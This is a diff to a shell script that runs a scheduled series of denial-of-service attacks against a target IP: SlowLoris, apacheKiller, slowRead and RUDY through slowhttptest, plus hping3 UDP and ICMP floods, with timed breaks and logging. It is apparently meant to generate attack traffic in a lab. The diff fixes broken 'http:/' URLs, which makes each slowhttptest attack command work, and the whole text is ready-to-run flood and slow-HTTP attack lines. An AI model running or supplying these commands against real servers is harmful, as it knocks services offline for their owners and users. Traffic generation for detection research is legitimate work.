@@ -74,7 +74,7 @@ echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 2
 attack_type="SlowLoris"
 attack_duration=$((13*60)) # in seconds
-attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"
+attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
@@ -89,7 +89,7 @@ echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 7
 attack_type="apacheKiller"
 attack_duration=$((16*60)) # in seconds
-attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http:/$destination_ip"
+attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http://$destination_ip"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
@@ -118,7 +118,7 @@ echo "Break 4 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 9
 attack_type="slowRead"
 attack_duration=$((13*60)) # in seconds
-attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http:/$destination_ip -p 3"
+attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
@@ -163,7 +163,7 @@ echo "Break 7 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 #Define variables for attack 4
 attack_type="RUDY"
 attack_duration=$((9*60)) # in seconds
-attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"
+attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
 
 attack $attack_type $attack_duration $destination_ip "$attack_script"
 
@@ -194,7 +194,7 @@ echo "Break 9 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_l
 attack_type="UDPandSlowLoris"
 attack_duration=$((15*60)) # in seconds
 attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
-attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http:/$destination_ip -x 24 -p 3"
+attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
 
 two_attacks $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
 
@@ -212,7 +212,7 @@ echo "Break 10 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_
 attack_type="ICMPandRUDY"
 attack_duration=$((10*60)) # in seconds
 attack_script1="hping3 --flood -1 $destination_ip"
-attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"
+attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
 
 two_attacks $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
 
